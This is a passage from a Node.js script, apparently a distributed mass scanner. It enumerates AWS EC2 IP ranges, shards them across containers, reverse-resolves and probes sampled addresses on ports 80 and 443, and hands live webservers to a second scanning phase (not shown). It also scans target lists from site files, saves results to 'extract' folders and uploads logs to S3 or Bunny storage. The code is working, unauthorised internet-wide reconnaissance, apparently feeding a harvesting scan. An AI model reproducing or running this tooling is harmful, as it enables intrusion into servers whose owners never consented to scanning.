      const total = Math.pow(2, 32 - prefix);
      if (total < MIN_CIDR_IPS) { skipped++; continue; }
      const ipParts = ip.split('.').map(Number);
      const first = (ipParts[0] << 24) | (ipParts[1] << 16) | (ipParts[2] << 8) | ipParts[3];
      // Align to network
      const mask = ~((1 << (32 - prefix)) - 1) >>> 0;
      const firstAligned = (first & mask) >>> 0;
      sources.push({ first: firstAligned, total, region });
    } catch (_) {}
  }
  const regionsSet = new Set(sources.map(s => s.region));
  log(`[AWS POOL] ${sources.length} CIDRs in ${regionsSet.size} regions (skipped ${skipped} CIDRs <${MIN_CIDR_IPS / 1_000_000}M IP, max ${MAX_IPS_PER_CIDR} IP/CIDR)`);
  return sources;
}

function ipFromInt(n) {
  return `${(n >>> 24) & 0xFF}.${(n >>> 16) & 0xFF}.${(n >>> 8) & 0xFF}.${n & 0xFF}`;
}

async function verifyEc2Webserver(ip, region) {
  try {
    const hostnames = await dns.promises.reverse(ip);
    const hostname = (hostnames[0] || '').toLowerCase();
    if (!hostname.includes('compute.amazonaws.com')) return null;

    for (const [port, proto] of [[443, 'https'], [80, 'http']]) {
      try {
        await new Promise((resolve, reject) => {
          const sock = new (port === 443 ? require('tls') : require('net')).Socket();
          sock.setTimeout(2000);
          sock.connect(port, hostname, () => { sock.destroy(); resolve(); });
          sock.on('error', reject);
          sock.on('timeout', () => { sock.destroy(); reject(new Error('timeout')); });
        });
        return `${proto}://${hostname}`;
      } catch (_) {}
    }
    return null;
  } catch (_) { return null; }
}

async function gatherAndScanCycle(cidrPool, workerId, numWorkers, cycleNum) {
  const allIps = [];

  for (const { first, total, region } of cidrPool) {
    const rem = ((INSTANCE_ID - (first % TOTAL_SLOTS)) % TOTAL_SLOTS + TOTAL_SLOTS) % TOTAL_SLOTS;
    if (rem >= total) continue;

    const offsetsPool = [];
    for (let o = rem; o < total; o += TOTAL_SLOTS) offsetsPool.push(o);

    let chosen;
    if (MAX_IPS_PER_CIDR >= offsetsPool.length) {
      chosen = offsetsPool;
    } else {
      // Deterministic shuffle based on seed
      const seed = first * 7919 + cycleNum * 104729;
      const rng = ((s) => () => { s = (s * 1664525 + 1013904223) | 0; return (s >>> 0) / 0xFFFFFFFF; })(seed);
      chosen = offsetsPool.sort(() => rng() - 0.5).slice(0, MAX_IPS_PER_CIDR);
    }

    for (const off of chosen) {
      allIps.push({ ip: ipFromInt(first + off), region });
    }
  }

  // Shuffle
  for (let i = allIps.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [allIps[i], allIps[j]] = [allIps[j], allIps[i]];
  }

  const myIps = allIps.filter((_, i) => i % numWorkers === workerId);
  for (let i = myIps.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [myIps[i], myIps[j]] = [myIps[j], myIps[i]];
  }

  if (workerId === 0) {
    log(`[AWS GATHER #${cycleNum}] Shard ${INSTANCE_ID}/${TOTAL_SLOTS}, ${allIps.length} IPs, split among ${numWorkers} workers (~${Math.floor(myIps.length / numWorkers)} each)`);
  }

  const seenUrls = new Set();
  let hits = 0, processed = 0, lastPct = -1;
  const totalMy = myIps.length;

  // Process in chunks
  for (let i = 0; i < myIps.length; i += DNS_WORKERS_EC2) {
    const chunk = myIps.slice(i, i + DNS_WORKERS_EC2);
    const results = await Promise.allSettled(chunk.map(({ ip, region }) =>
      verifyEc2Webserver(ip, region)
    ));

    for (const r of results) {
      processed++;
      if (r.status === 'fulfilled' && r.value && !seenUrls.has(r.value)) {
        seenUrls.add(r.value);
        hits++;
      }
    }

    const pct = Math.floor(processed * 100 / totalMy);
    if (pct >= lastPct + 10) {
      lastPct = pct - (pct % 10);
      log(`[W${workerId} GATHER #${cycleNum}] ${pct}% (${processed}/${totalMy}) — ${hits} webservers, ${processed - hits} discarded`);
    }
  }

  const urls = [...seenUrls];
  for (let i = urls.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [urls[i], urls[j]] = [urls[j], urls[i]];
  }

  log(`[W${workerId} GATHER #${cycleNum}] Phase 1: ${hits} webservers, ${processed - hits} discarded out of ${totalMy} IPs`);

  if (urls.length > 0) {
    log(`[W${workerId}] Phase 2 — Scanning ${urls.length} verified URLs...`);
    await processUrls(urls);
    log(`[W${workerId}] Phase 2 completed.`);
  } else {
    log(`[W${workerId}] No URLs found. Skipping scan.`);
  }
}

// ================================================================
// MAIN — WORKER LOOP
// ================================================================
async function workerLoop(workerId) {
  let cycle = 0;
  let cidrPool = null;

  if (LOAD_FROM_CIDR) {
    try {
      const awsData = await fetchAwsIps();
      const ec2Cidrs = getEc2Cidrs(awsData);
      if (ec2Cidrs.length === 0) {
        log('[SYS] No EC2 CIDRs found.');
      } else {
        log(`[SYS] Found ${ec2Cidrs.length} EC2 CIDRs. Building pool...`);
        cidrPool = buildCidrPool(ec2Cidrs);
      }
    } catch (e) {
      log(`[SYS] ERROR fetching AWS IPs: ${e.message}`);
    }
  }

  if (LOAD_FROM_CIDR && !cidrPool) {
    log('[SYS] ERROR: LOAD_FROM_CIDR=true but no CIDRs available. Exiting.');
    return;
  }

  while (true) {
    cycle++;

    // Phase SITE
    if (LOAD_FROM_SITE) {
      let filesProcessed = 0;
      while (true) {
        const { targets, filepath } = await loadSitesFromFolder();
        if (targets.length === 0) {
          if (filesProcessed > 0) {
            log(`[SITE] Worker ${workerId} — All files processed (${filesProcessed} files).`);
          } else {
            log(`[SITE] Worker ${workerId} — No .txt files in site/. Waiting...`);
          }
          break;
        }
        const fname = path.basename(filepath);
        log(`[SITE] Worker ${workerId} — Scanning ${fname}: ${targets.length} targets`);
        await processUrls(targets);
        await deleteSiteFile(filepath);
        filesProcessed++;
      }
    }

    // Phase CIDR
    if (LOAD_FROM_CIDR && cidrPool) {
      await gatherAndScanCycle(cidrPool, workerId, NUM_WORKERS, cycle);
      log(`[W${workerId}] Cycle #${cycle} completed.`);
    }

    // Exit conditions
    if (LOAD_FROM_SITE && !LOAD_FROM_CIDR) {
      log(`[SYS] Worker ${workerId} — Done. No CIDR active, exiting.`);
      break;
    }
    if (!LOAD_FROM_SITE && !LOAD_FROM_CIDR) break;

    await sleep(2000);
  }
}

// ================================================================
// LOG UPLOAD LOOP
// ================================================================
function startLogUploadLoop() {
  setInterval(() => {
    uploadLog().catch(() => {});
  }, LOG_UPLOAD_INTERVAL * 1000);
}

// ================================================================
// ENTRY POINT
// ================================================================
async function main() {
  if (LOG_ACTIVE) {
    await fs.promises.mkdir(LOGS_DIR, { recursive: true });
    const containerId = process.env.HOSTNAME || `local_${Math.floor(Date.now() / 1000)}`;
    LOG_PATH = path.join(LOGS_DIR, `${containerId}.log`);
    const tee = new TeeLogger(LOG_PATH);
    console.log = (...args) => {
      const msg = args.map(a => typeof a === 'string' ? a : JSON.stringify(a)).join(' ') + '\n';
      tee.write(msg);
    };
    console.error = console.log;
  }

  log('\n[SYS] Cloud worker starting...');
  if (LOG_ACTIVE) log(`[SYS] Log saved to: ${LOG_PATH}`);

  await fs.promises.mkdir(RESULT_DIR, { recursive: true });
  await fs.promises.mkdir(NEW_PATH_EXTRACT, { recursive: true });

  log(`[SYS] AWS_S3=${AWS_S3}  BUNNY_STORAGE=${BUNNY_STORAGE}`);
  log(`[SYS] LOAD_FROM_SITE=${LOAD_FROM_SITE}  LOAD_FROM_CIDR=${LOAD_FROM_CIDR}`);
  log(`[SYS] Container-ID=${INSTANCE_ID} (of ${TOTAL_SLOTS} slots), ${NUM_WORKERS} workers, ~${MAX_IPS_PER_CIDR} IP/CIDR`);

  if (!LOAD_FROM_SITE && !LOAD_FROM_CIDR) {
    log('[SYS] ERROR: LOAD_FROM_SITE=false and LOAD_FROM_CIDR=false. No target source. Exiting.');
    return;
  }

  log(`[SYS] Starting ${NUM_WORKERS} worker(s)`);
  startLogUploadLoop();

  const workers = [];
  for (let w = 0; w < NUM_WORKERS; w++) {
    workers.push(workerLoop(w).catch(e => log(`[SYS] Worker ${w} crashed: ${e.message}`)));
  }

  await Promise.all(workers);
  log('[SYS] All workers finished.');
}

if (require.main === module) {
  main().catch(e => {
    console.error(`[FATAL] ${e.message}`, e.stack);
    process.exit(1);
  });
}
